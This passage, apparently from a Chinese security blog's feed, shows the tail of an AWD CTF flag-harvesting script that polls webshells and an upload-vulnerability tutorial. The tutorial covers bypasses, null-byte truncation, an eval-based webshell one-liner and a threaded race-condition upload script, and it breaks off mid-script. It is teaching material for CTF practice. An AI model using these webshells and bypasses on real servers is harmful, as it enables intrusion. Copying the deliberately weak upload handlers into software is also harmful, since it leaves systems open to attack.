<span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">                <span class="keyword">print</span> url1 + <span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">                <span class="comment"># 记录shell和获取的flag</span></span><br><span class="line">                <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">                <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</span><br><span class="line">                <span class="comment"># 正则捕获flag</span></span><br><span class="line">                <span class="keyword">if</span> re.match(<span class="string">r'hello world(\w+)'</span>, res.text):   </span><br><span class="line">                    flag = re.match(<span class="string">r'hello world(\w+)'</span>, res.text).group(<span class="number">1</span>)</span><br><span class="line">                    submit_flag(url1, teamtoken, flag)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"[-]Can not get flag"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"shell 404"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> url1 + <span class="string">"connect shell failed"</span></span><br><span class="line">    </span><br><span class="line">    f.close()</span><br><span class="line">    f1.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timer</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag()</span><br><span class="line">        flag()</span><br><span class="line">        flag()</span><br><span class="line">        time.sleep(n)</span><br><span class="line"></span><br><span class="line">timer(<span class="number">120</span>)</span><br></pre></td></tr></table></figure><p><img src="/2019/02/08/Web_13/20190207182658.png" alt></p><p>附上 Rcoil 师傅线下攻防思维导图<br><img src="/2019/02/08/Web_13/20190206164035.png" alt></p><h2 id="0X04-参考链接"><a href="#0X04-参考链接" class="headerlink" title="0X04 参考链接"></a>0X04 参考链接</h2><p><a href="https://github.com/admintony/Prepare-for-AWD" target="_blank" rel="noopener">AWD线下赛脚本集合</a></p><p><a href="https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">CTF线下攻防赛总结-RcoIl</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0X00-前言&quot;&gt;&lt;a href=&quot;#0X00-前言&quot; class=&quot;headerlink&quot; title=&quot;0X00 前言&quot;&gt;&lt;/a&gt;0X00 前言&lt;/h2&gt;&lt;p&gt;安洵杯线下一脸懵逼，西石油线下毫无悬念被打爆，于是有了整理实践线下文章资料的念头，同时也感谢 DOg3@Ph0rse 的分享。萌新文章，大佬们可以不用care了。&lt;/p&gt;
&lt;h2 id=&quot;0x01-关于线下&quot;&gt;&lt;a href=&quot;#0x01-关于线下&quot; class=&quot;headerlink&quot; title=&quot;0x01 关于线下&quot;&gt;&lt;/a&gt;0x01 关于线下&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;AWD模式：Attack With Defence，攻击中防御，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;高地模式：每只队伍服务器可以访问，没有权限，需要自己去获取权限。同时存在高地服务器，不属于任何一支队伍，每只队伍竞争高地服务器权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;域渗透：Windows AD 域环境，更贴近实战&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;更加详细可参见：&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Web基础漏洞之文件上传</title>
    <link href="https://jlkl.github.io/2019/01/05/Web_12/"/>
    <id>https://jlkl.github.io/2019/01/05/Web_12/</id>
    <published>2019-01-05T07:22:18.000Z</published>
    <updated>2019-01-05T07:28:39.181Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>&emsp;本来打算是作为一个系列一直更新下去，讲解基础漏洞的原理、基本防御和攻击方法。但是看到师傅们的总结都很全面，尝试总结了一下发现大多都是照搬，只有等到有新的东西才写下来啦。</p><a id="more"></a><h2 id="2-概述"><a href="#2-概述" class="headerlink" title="2.概述"></a>2.概述</h2><p>在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。</p><p>如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。一般会搭配解析漏洞或文件包含漏洞。</p><h2 id="3-上传检测"><a href="#3-上传检测" class="headerlink" title="3.上传检测"></a>3.上传检测</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。</p><p>一般文件上传检测分为客户端检测和服务端检测</p><h3 id="3-1-客户端检测"><a href="#3-1-客户端检测" class="headerlink" title="3.1.客户端检测"></a>3.1.客户端检测</h3><p>一般使用 javascript 检验后缀名是否合法，在浏览加载文件，但还未点击上传按钮时便弹出对话框,示例代码如下：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function CheckFileType()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> objButton=<span class="built_in">document</span>.getElementById(<span class="string">"Button1"</span>);<span class="comment">//上传按钮</span></span><br><span class="line">    <span class="keyword">var</span> objFileUpload=<span class="built_in">document</span>.getElementById(<span class="string">"FileUpload1"</span>);</span><br><span class="line">    <span class="keyword">var</span> objMSG=<span class="built_in">document</span>.getElementById(<span class="string">"msg"</span>);<span class="comment">//显示提示信息用DIV</span></span><br><span class="line">    <span class="keyword">var</span> FileName=<span class="keyword">new</span> <span class="built_in">String</span>(objFileUpload.value);<span class="comment">//文件名</span></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">extension</span>=<span class="keyword">new</span> <span class="built_in">String</span>(FileName.substring(FileName.lastIndexOf(<span class="string">"."</span>)+<span class="number">1</span>,FileName.length));<span class="comment">//文件扩展名</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">extension</span>==<span class="string">"jpg"</span>||<span class="keyword">extension</span>==<span class="string">"JPG"</span>)<span class="comment">//可以另行添加扩展名</span></span><br><span class="line">    &#123;</span><br><span class="line">        objButton.disabled=<span class="keyword">false</span>;<span class="comment">//启用上传按钮</span></span><br><span class="line">        objMSG.innerHTML=<span class="string">"文件检测通过"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        objButton.disabled=<span class="keyword">true</span>;<span class="comment">//禁用上传按钮</span></span><br><span class="line">        objMSG.innerHTML=<span class="string">"请选择正确的文件上传"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方法：</p><ul><li>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp</li><li>上传页面，审查元素，修改或禁用 JavaScript 检测函数<h3 id="3-2-服务端检验"><a href="#3-2-服务端检验" class="headerlink" title="3.2.服务端检验"></a>3.2.服务端检验</h3><h4 id="3-2-1-MIME类型检测"><a href="#3-2-1-MIME类型检测" class="headerlink" title="3.2.1.MIME类型检测"></a>3.2.1.MIME类型检测</h4>MIME：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</li></ul><p>示例代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">'./'</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>关键代码：<code>if($_FILES[&#39;file&#39;][&#39;type&#39;] != &quot;image/gif&quot;)</code></p><p>绕过方法：</p><p>Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型</p><h4 id="3-2-2-文件扩展名检测"><a href="#3-2-2-文件扩展名检测" class="headerlink" title="3.2.2.文件扩展名检测"></a>3.2.2.文件扩展名检测</h4><p>分为白名单和黑名单检测，一般白名单比黑名单安全</p><h5 id="3-2-2-1-黑名单检测"><a href="#3-2-2-1-黑名单检测" class="headerlink" title="3.2.2.1.黑名单检测"></a>3.2.2.1.黑名单检测</h5><p>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等等</p><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">//sunstr - 返回字符串的子串</span></span></span><br><span class="line"><span class="php">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></span></span><br><span class="line"><span class="php">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $filename = time().<span class="string">"."</span>.$new_upload_file_ext;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"upload/"</span>.$filename))</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="3-2-2-2-白名单检测"><a href="#3-2-2-2-白名单检测" class="headerlink" title="3.2.2.2.白名单检测"></a>3.2.2.2.白名单检测</h5><p>仅允许指定的文件类型上传，比如仅与需上传jpg 、 gif 、 doc等类型的文件，其他全部禁止</p><h5 id="3-2-2-3-绕过方法"><a href="#3-2-2-3-绕过方法" class="headerlink" title="3.2.2.3.绕过方法"></a>3.2.2.3.绕过方法</h5><p>①文件名大小写绕过</p><p>用像 AsP，pHp 之类的文件名绕过黑名单检测</p><p>②名单列表绕过</p><p>能被解析的文件扩展名列表：</p><p>jsp jspx jspf</p><p>asp asa cer aspx cdx</p><p>php php php3 php4</p><p>exe exee</p><p>③特殊文件名绕过</p><p>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的<strong>点和空格</strong>，但要注意 <strong>Unix/Linux 系统没有这个特性</strong></p><p>④0x00截断</p><p>截断的核心，就是chr(0)这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格。 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 。</p><p>伪代码演示</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">name</span>= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line"><span class="keyword">type</span> =gettype(<span class="keyword">name</span>)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">type</span> == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.<span class="keyword">name</span>, <span class="keyword">name</span>)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">CVE-<span class="number">2015</span>-<span class="number">2348</span></span><br><span class="line"></span><br><span class="line">PHP before <span class="number">5.4</span>.<span class="number">39</span>, <span class="number">5.5</span>.x before <span class="number">5.5</span>.<span class="number">23</span>, <span class="keyword">and</span> <span class="number">5.6</span>.x before <span class="number">5.6</span>.<span class="number">7</span></span><br><span class="line"></span><br><span class="line">move_uploaded_file<span class="built_in">(string</span> <span class="variable">$filename</span><span class="built_in">,string</span> <span class="variable">$destination</span>)</span><br><span class="line"><span class="variable">$destination</span>参数代表得失上传文件移动的最终目的地址</span><br><span class="line">如果<span class="variable">$destination</span>变量是从用户<span class="variable">$_GET</span>或<span class="variable">$_POST</span>中获得的并且我们可控，</span><br><span class="line">那么我们可以利用空字符\x0<span class="number">0</span>来截断后面的拓展名，从而造成任意文件上传</span><br><span class="line">*/</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'Upload'</span>]))&#123;</span><br><span class="line">    <span class="variable">$target_path</span> = WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span> = substr(<span class="variable">$uploaded_name</span>, strrpos(<span class="variable">$uploaded_name</span>, <span class="string">'.'</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">"jpg"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"JPG"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"jpeg"</span> || <span class="variable">$uploaded_ext</span> == <span class="string">"JPEG"</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$_POST</span>[<span class="string">'drops'</span>])) &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="variable">$target_path</span> . <span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\x00.jpg&quot;);</code></p><p>这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php</p><p>这里比较有趣的一点是在获取文件名后缀时</p><p><code>$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, &#39;.&#39;) + 1);</code></p><p>由于在C、PHP等语言的常用字符串处理函数中，0x00被认为是终止符，文件名为 <code>test.jpg0x00.php</code> 时 PHP 仍认为后缀为 jpg，这个特性在 PHP5-PHP7 都是存在的。</p><h4 id="3-2-3-服务端文件内容检测"><a href="#3-2-3-服务端文件内容检测" class="headerlink" title="3.2.3.服务端文件内容检测"></a>3.2.3.服务端文件内容检测</h4><h5 id="3-2-3-1-文件头检测"><a href="#3-2-3-1-文件头检测" class="headerlink" title="3.2.3.1.文件头检测"></a>3.2.3.1.文件头检测</h5><p>常见文件头：</p><p>JPG ： FF D8 FF E0 00 10 4A 46 49 46</p><p>GIF ： 47 49 46 38 39 61 (GIF89a)</p><p>PNG： 89 50 4E 47</p><p><a href="https://weizhimiao.github.io/2016/10/23/PHP根据文件头检测文件类型/" target="_blank" rel="noopener">PHP根据文件头检测文件类型</a></p><h5 id="3-2-3-2-文件相关信息检测"><a href="#3-2-3-2-文件相关信息检测" class="headerlink" title="3.2.3.2.文件相关信息检测"></a>3.2.3.2.文件相关信息检测</h5><p>一般就是检查图片文件的大小，图片文件的尺寸之类的信息,常用getimagesize()函数</p><h5 id="3-2-3-3-绕过方法"><a href="#3-2-3-3-绕过方法" class="headerlink" title="3.2.3.3.绕过方法"></a>3.2.3.3.绕过方法</h5><p>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可</p><h2 id="4-其他"><a href="#4-其他" class="headerlink" title="4.其他"></a>4.其他</h2><h3 id="4-1-竞争上传"><a href="#4-1-竞争上传" class="headerlink" title="4.1.竞争上传"></a>4.1.竞争上传</h3><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span></span><br><span class="line"><span class="php">$size = <span class="number">10000000</span>;</span></span><br><span class="line"><span class="php">$path = <span class="string">"./"</span>;</span></span><br><span class="line"><span class="php">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$newfile = $path.$filename;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="php">    unlink($newfile);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span></span><br><span class="line"><span class="php">    unlink($newfile);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><p><code>&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;</code></p><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span>(<span class="title">threading</span>.<span class="title">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        threading.Thread.__init_<span class="number">_</span>(<span class="keyword">self</span>)</span><br><span class="line">        <span class="keyword">self</span>.url = <span class="string">"http://127.0.0.1/code/upload/shell.php"</span></span><br><span class="line">        <span class="keyword">self</span>.uploadUrl = <span class="string">"http://127.0.0.1/code/upload_compete.php"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(<span class="keyword">self</span>.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span><span class="symbol">:</span></span><br><span class="line">            print(<span class="string">"[*]create file Str3am.php success"</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        file = &#123;<span class="string">"file"</span><span class="symbol">:open</span>(<span class="string">"shell.php"</span>,<span class="string">"r"</span>)&#125;</span><br><span class="line">        requests.post(<span class="keyword">self</span>.uploadUrl, files=file)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>._upload()</span><br><span class="line">                <span class="keyword">self</span>._get()</span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span></span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads)<span class="symbol">:</span></span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads)<span 